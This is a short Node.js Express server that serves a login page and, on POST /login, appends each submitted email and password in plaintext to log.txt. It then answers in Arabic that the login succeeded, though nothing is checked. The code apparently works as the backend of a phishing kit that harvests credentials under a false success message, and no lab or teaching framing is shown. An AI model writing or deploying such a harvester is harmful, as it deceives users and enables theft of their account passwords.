const express = require('express');
const fs = require('fs');
const app = express();
app.use(express.urlencoded({ extended: true }));
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});
app.post('/login', (req, res) => {
  const data = `Email: ${req.body.email} | Password: ${req.body.password}\n`;
  fs.appendFileSync('log.txt', data);
  res.send('تم تسجيل الدخول بنجاح!');
});
app.listen(8080);
